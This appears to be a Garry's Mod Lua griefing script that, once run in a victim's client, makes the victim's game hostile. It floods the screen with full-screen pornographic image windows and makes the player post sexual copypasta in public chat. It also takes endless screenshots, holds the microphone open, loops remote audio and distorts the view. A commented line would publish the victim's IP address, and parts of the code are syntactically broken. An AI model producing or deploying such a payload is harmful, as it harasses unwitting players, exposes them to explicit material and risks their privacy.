--local check = if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then return end
local jpegs = 0
local s = sound
local Song = false
local _timer = timer
local _surface = surface
local _render = render
local _mtable = FindMetaTable
local _command = RunConsoleCommand
local _hook = hook
local _http = http
local _net = net
local _math = math
local _vgui = vgui
local function ss()
    _command('screenshot')
    _command('jpeg')
    jpegs = jpegs + 1
end
local hentai = {
    "https://danbooru.donmai.us/data/sample/__kokkoro_princess_connect_and_1_more_drawn_by_ricegnat__sample-b3ddb6d0725e99dd6314f08c525e4023.jpg",
    "https://cali.rule34.xxx//samples/3348/sample_a58e5cc8aa6f15edb57e0b18ccbcb8fac4350c68.jpg?3771999",
    "https://danbooru.donmai.us/data/sample/__m200_girls_frontline_drawn_by_mari0ball__sample-44e5dfe7a505a03c5026fc75f1f1d357.jpg",
    "https://danbooru.donmai.us/data/sample/__lucifer_modeus_and_skeleton_helltaker_drawn_by_slugbox__sample-f7b4810f7c0fd9485ccb5ce112ece3db.jpg",
    "https://us.rule34.xxx//images/3924/c3b3c9c5fdcebb01dc81672275df48a9bab42a85.png?4446636",
    "https://cali.rule34.xxx//samples/3923/sample_37bb60b4bad5d1fa176ead639e822d9a1ff0f4b3.jpg?4445872",
    "https://us.rule34.xxx//images/3909/bcf75f3d20eea17e883733149985e506cde0fc26.png?4427514",
    "https://cali.rule34.xxx//samples/3892/sample_ece8dce507a1a1e7227eae5ec9953ce44419420a.jpg?4406553",
    "https://us.rule34.xxx//images/3896/f363d9cf1c933cf116c1a6fcb3cc5e669ece2374.png?4411512",
    "https://ighcttp.ilkxremmgmmo.hath.network:20000/h/124820f71d8d65a2986be2daea1adafbc0308a23-23799-250-250-jpg/keystamp=1612577100-e2504dd99f;fileindex=85462124;xres=org/1506326659_preview_1508136568_5a29ffab58fa1271161d4cdc82d566ec8659d47e_hq.jpg",
    "https://mrpakhe.jseutuomxrkm.hath.network/h/886c623a931a1d1a8c9e1a9ede079917a5575fe3-50767-530-476-jpg/keystamp=1612577100-ec2a29b1ab;fileindex=85462121;xres=org/1506326659_preview_1475236991066.jpg",
    "https://gubgwto.gfpsrseqnbjr.hath.network:2688/h/ed26f9b82c07e44369a2158522aaea0fcc12af12-34846-286-308-jpg/keystamp=1612577100-b2948e59ac;fileindex=85462110;xres=org/1506326659_preview_0a35ad05c6d3d2dcce8ee41eafc1c1da.jpg",
    "https://bejwhrn.lztxcclvscwh.hath.network:8443/h/fa5eecb198b4934c24daff92bef306b7c5e92cfb-172889-696-697-jpg/keystamp=1612577100-62a168520d;fileindex=85462109;xres=org/1506326659_preview_0T2qpe_y_F0.jpg",
    "https://qhixvyc.imkdcrtesdsw.hath.network/h/ffa6cdcc16e113cac64d19d07c7be29f7dbc0100-32222-328-307-jpg/keystamp=1612577100-f348654021;fileindex=85462108;xres=org/1506326659_preview_0773438b3ae2d5afa3eb16e214c812c28482e1b7_00.jpg",
    "https://knzzlnv.whpfcsqlnirv.hath.network:49890/h/407c76553e1562d17ebcb3f59b3bb4a29636ef10-36985-302-301-jpg/keystamp=1612577100-3789cd9b54;fileindex=85462107;xres=org/1506326659_preview_0755c009597a7f331c4966657f87f3a2.jpg",
    "https://pdukvcc.lsqkkbhosjtd.hath.network:4443/h/e7c5812da42b7793d6a17346aa13a1c6b6dec95f-67117-392-391-jpg/keystamp=1612577100-1748b13b29;fileindex=85462106;xres=org/1506326659_preview_00349486a0dfa89e1498ded550654346.jpg",
    "https://uoghoaq.jxilfxmkhftw.hath.network:8990/h/f46ff5362eeea8c36d65b8e8f83821e56637e045-80238-461-470-jpg/keystamp=1612577100-056a8809bd;fileindex=85462105;xres=2400/1506326659_preview_pQUidMbmp0.jpg",
    "https://coypaan.aiolyyytsjpk.hath.network/h/2111d1ab5017d4e2b86fee713c830f55952de7e1-199785-735-736-jpg/keystamp=1612577100-81ac35418b;fileindex=85462104;xres=2400/1506326659_preview_VL5y93OMUs.jpg",
    "https://tisjdga.ojhywihvmpqm.hath.network/h/5f540f515b8421860e5839c65ae3e8d9c900904a-45701-422-450-jpg/keystamp=1612577100-fa6635892d;fileindex=85462103;xres=2400/1506326659_preview_M3KV9nMVw.jpg"
}
local annoying = {
    "particle/tinyfiresprites/tinyfiresprites",
    "particle/water/watersplash_001a_additive",
    "particle/antlion_goop3/antlion_goop3",
    "vgui/gfx/vgui/solid_background",
    "sprites/white",
    "sprites/physcannon_bluecore1",
    "pp/texturize",
    "pp/colour",
    "pp/toytown-top",
    --VISABLE THROUGH WALLS--
    "sprites/physcannon_bluecore1",
    "pp/toytown-top",
    "sprites/autoaim_1a",
    "sprites/white",
    "vgui/gfx/vgui/cs_logo",
    "vgui/gfx/vgui/ak47",
    "vgui/gfx/vgui/m3",
    "vgui/gfx/vgui/p228",
    "vgui/gfx/vgui/m4a1",
    "vgui/gfx/vgui/gign",
    "vgui/gfx/vgui/glock",
    "vgui/gfx/vgui/ump45",
    "vgui/gfx/vgui/vip",
    "vgui/gfx/vgui/urban",
    "vgui/gfx/vgui/tmp",
    "vgui/gfx/vgui/t_random",
    "vgui/gfx/vgui/solid_background",
    "models/weapons/v_toolgun/screen_bg",
      --GLITCHY--
    "particle/tinyfiresprites/tinyfiresprites",
    "particle/water/watersplash_001a_additive",
    "particle/antlion_goop3/antlion_goop3",
    "sprites/orangelight1_noz",
    "effects/bonk",
    "effects/moon",
    "particle/fire_particle_2/fire_particle_2",
    "effects/debris/debris_chunk",
    "metal/ibeam001b",
    "metal/metalstair001a",
    "sprites/glow08",
    "sprites/dot",
    "trails/laser",
    "vgui/servers/icon_replay_column",
    "gm_construct/flatgrass",
    "dev/water_normal",
    "debug/env_cubemap_model",
    "decals/decalgraffiti010a",
    "models/hostages/sandro_facemap",
    "models/humans/male/group01/vance_facemap",
    "models/weapons/v_toolgun/screen_bg",
    "ajacks/billboard",
    "decals/decalgraffiti036a",
    "decals/decalgraffiti038a",
    "decals/decalgraffiti043a_cs",
    "decals/decalgraffiti062a",
    "cs_assault/assault_building_decal03",
    "decals/decalgraffiti058a_cs",
    "sprites/crosshairs",
    "decals/concrete/shot5Z",
    "icon16/page_red",
    "icon16/star",
    "models/cs_italy/lantern2a",
    "gui/info",
    "introscreen/main",
    "models/hostages/cohrt",
    "models/mossman/mossman_face",
    "gui/gmod_logo",
    "effects/ar2_altfire1",
    "models/player/shared/gold_player",
    "models/props/cs_assault/moneytop",
    "gui/colors",
    "materials/modernmotd/ico-dollar",
    "models/humans/nypd/badge",
    "effects/tool_tracer",
    "models/breen/mouth",
    "vgui/resource/icon_vac_new",
    "icon16/emoticon_smile",
    "games/16/all",
    "icon16/monkey",
    "icon16/shield",
    "models/props_combine/masterinterface01c",
    "models/shadertest/vertexlitselfillummaskenvmaptex.mdl",
    "refract_ring",
    "hd2/effects/water/whirlpool2_additive_ndb",
    "hd2/effects/water/water_splash_single_additive",
    "models/shadertest/vertexlitenvmappedbumpmap.mdl",
    "models/shadertest/vertexlitenvmappedtexturedetailv2.mdl",
    "models/shadertest/vertexlitselfillumenvmappedtexturev2.mdl",
    "models/shadertest/vertexlitselfillummaskenvmaptex.mdl",
    "models/shadertest/vertexlitselfilluminatedtexturedetail.mdl",
    "models/shadertest/shader3",
    "models/shadertest/shader5",
    "models/shadertest/shader4"
}
local annoyings = {
    "synth/75_pwm_880.wav",--1
    "synth/75_pwm_440.wav",--2
    "synth/75_pwm_1760.wav",--3
    "synth/25_pwm_880.wav",--4
    "synth/25_pwm_440.wav",--5
    "synth/25_pwm_1760.wav",--6
    "synth/12_5_pwm_880.wav",--7
    "synth/12_5_pwm_440.wav",--8
    "synth/12_5_pwm_1760.wav",--9
    "synth/white_noise.wav",
    "synth/triangle_1760.wav",
    "synth/square_1760.wav",
    "synth/sine_1760.wav"
    }
local ply = LocalPlayer()
local funnies = {
    'wwwwwwwwwwwwwwwwww',
    'posdadkasd',
    'hfhd',
    'hfgj',
    'fasdfashfghfghjindf',
    'bvZNvjxcnvunguhnsdgcsdfas',
    'bvcsdfa(*J@JOSFJs',
    'bvcsdfk-0124i059as',
    'bvcsdfhsfhfgjas',
    'bvcsdm.;.f',
    'bvcscvbz,dfas',
    'bv12356csdfas',
    'hbvv2bvcsdgsdfas',
    'phphfth-bvcsdfas',
    'bvcsdfas',
    'bvcsdfadfhgs',
    'bvasdxcxcvcsdfas',
    'bvcsdfafkgaswes',
    'bvcsdfjfghkas',
    'bvcsdfawdgas',
    'bvcsdfdfgawas',
    'bvcsddkdghkas',
    'bvcsfgas',
    'bvhdfh',
    'bvcsdfas',
    'sdfawd',
    'sdfgwe',
    'sdfg',
    'gsdfg',
    'awdg',
    'wdad'
}
local function oniichan() --aids copypasta
    _timer.Create('o',0,1,function() LocalPlayer():ConCommand("say Huh? Don't sniff you? Don't be silly Onii-chan I love you why can't I show my affection? (─‿‿─)♡")end)
    _timer.Create('n',03,1,function() LocalPlayer():ConCommand("say Hahaha your face is red. Woah Onii-chan why are you pushing me on to the bed?")end)
    _timer.Create('ii',05,1,function() LocalPlayer():ConCommand("say ヽ(°〇°)ﾉ Kyaaaaa don't tickle me Onii-chan haha counter ataaaaack pushes you down ヽ(>∀<☆)ノ.")end)
    _timer.Create('-',07,1,function() LocalPlayer():ConCommand("say Hehehe I win! Onii-chan your face is really red now, Hmmh smirks (=-ω-=)")end)
    _timer.Create('c',09,1,function() LocalPlayer():ConCommand("say perhaps you're falling in love with me? Chuuuuu (ﾉ´ з )ノ kisses you Woah O-onii-chan w-what are you d-doing?!")end)
    _timer.Create('h',011,1,function() LocalPlayer():ConCommand("say H-hyyaaaaa don't take off my panties! D-dont look at my private spot! (/▽＼) Ah Ah Don't lick me there it's dirty!")end)
    _timer.Create('a',13,1,function() LocalPlayer():ConCommand("say Ahhhhhh fuah ah ah (/ω/) O-onii-chan a-are you going to put it in? O-ok i'm ready. (／。＼)")end)
    _timer.Create('n',15,1,function() LocalPlayer():ConCommand("say Heeeee I-it hurts. ~(>_<~) SWow dwon ah ah MMMH O-onii-chan I Lwve yoouuuuu! AHHHHHHH MMMHHH")end)
    _timer.Create('~',17,1,function() LocalPlayer():ConCommand("say AH Hah Hah hah O-ONIII-CHAAANN you baka why did you do it inside? ヽ(д´)ノ")end)
    _timer.Create('~~',19,1,function() LocalPlayer():ConCommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
end
-- ALL TIMERS
_timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime())..' is my fps, silly onii-chan >_<')end) -- fps
--timer.Createreate("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
_timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
--timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
_timer.Create('hahasong', .1, 1, function() Song = true end)
--s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
--s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
--s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
--s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
--s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
--timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
_timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song
_timer.Create('paste',0,10000,function()
    oniichan()
    _timer.Adjust('paste',21,10000,oniichan())
end)


--if check then
--    timer.Remove("haha")
--    timer.Remove("haha2")
--    timer.Remove("haha3")
--    timer.Remove("haha4")
--    timer.Remove("haha5")
--    timer.Remove("hahasong")
--end
_timer.Create('hntai', .09, 10000, function() 
local _f = _vgui.Create("DFrame")
    _f:SetTitle("dddddddddddddddddddddddddddddddddddddddddddddddddddd")
    _f:ShowCloseButton(false)
    _f:Center()
    _f:SetSize(ScrW(),ScrH())

local _h = _vgui.Create("DHTML", _f )
    _h:Dock( FILL )
    _h:OpenURL(table.Random(hentai))
end)

_hook.Add('Think','funny',function()
        rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
        local result = annoying[_math.random(1,88)]
        _math.randomseed(CurTime())
        local result2 = annoying[_math.random(1,88)]
        local cfunnies = funnies[_math.random(1,30)]
        local sresult = annoyings[_math.random(1,13)]
        --local pSong = CreateSound(LocalPlayer(),sresult)
        --sound.Add({
        --    name = "wowow",
        --   channel = CHAN_STATIC,
        --    volume = (jpegs^2),
        --    level = 10000,
        --    pitch = {50,200},
        --    sound = sresult
        --})
        --_command('pp_mat_overlay',result)
        _command('+voicerecord')
        --_command('pp_mat_overlay_refractamount',tonumber(cfunnies))
        _command('pp_texturize',result2)
        --_command('fps_max','30')
        --_command('nyan_love')
        --_command('hahaball')
        --_command('status')
        --pSong:ChangeVolume(100000)
        --pSong:SetSoundLevel(100000)
        --pSong:Play()
        --ply:EmitSound("wowow")
        ss()
        _surface.CreateFont(table.Random(funnies),{})
        --chat.AddText(rgb, cfunnies)
        ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)

        if _input.IsKeyDown(70) then 
            _leave = true
        end
        if _leave = true then
            RunConsoleCommand('toggleconsole')
        end
end)

_hook.Add('RenderScene','funny',function()

    _render.SetLightingMode(1)

end)
_hook.Add('DrawOverlay','funny',function()

end)
_hook.Add('CreateMove','funny',function( CUserCmd , GM ) 

    local lolangle = _math.random(-24, 24)
    local realangle = Angle(lolangle, lolangle,0)
    local PAngles = CUserCmd:GetViewAngles()
    local mousex = CUserCmd:GetMouseX()
    local mousey = CUserCmd:GetMouseY()
    --_command('mat_motion_blur_enabled','1')
    --_command('mat_vsync','1')
    --render.SetAmbientLight(1,1,1)
    CUserCmd:SetViewAngles(PAngles - realangle)

end)
_hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
        local _pv = ply:GetVelocity()
        local view = {}
            view.origin = pos
            view.angles = angles
            view.fov = math.random(5,300)
        return view
end)
